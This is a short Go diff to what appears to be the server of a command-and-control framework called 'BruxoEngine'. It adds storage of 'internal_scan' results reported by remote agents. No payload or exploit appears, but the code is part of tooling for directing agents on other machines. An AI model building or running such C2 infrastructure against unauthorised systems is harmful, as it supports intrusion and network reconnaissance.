@@ -147,8 +147,9 @@ type Agent struct {
 	Hostname  string    `json:"hostname"`
 	OS        string    `json:"os"`
 	LastSeen  time.Time `json:"last_seen"`
-	Status    string    `json:"status"`
-	taskQueue chan Task `json:"-"` // Not serialized
+	Status              string   `json:"status"`
+	InternalScanResults []string `json:"internal_scan_results,omitempty"`
+	taskQueue           chan Task `json:"-"` // Not serialized
 }
 
 type Task struct {
@@ -1574,6 +1575,17 @@ func (b *BruxoEngine) handlePostResult(w http.ResponseWriter, r *http.Request) {
 		task.Status = "completed"
 		b.logger.Info("Result received for task %s from agent %s", data.TaskID, agentID)
 		fmt.Printf("\n--- C2 RESULT (Task: %s, Agent: %s) ---\n%s\n-------------------------------------\n", data.TaskID, agentID, data.Result)
+
+		// Processar resultados de scans internos
+		if strings.HasPrefix(task.Command, "internal_scan") {
+			if agent, agentOK := b.c2Agents[agentID]; agentOK {
+				lines := strings.Split(data.Result, "\n")
+				if len(lines) > 1 {
+					agent.InternalScanResults = append(agent.InternalScanResults, lines[1:]...)
+				}
+			}
+		}
+
 	} else {
 		b.logger.Error("Received result for unknown task ID: %s", data.TaskID)
 	}
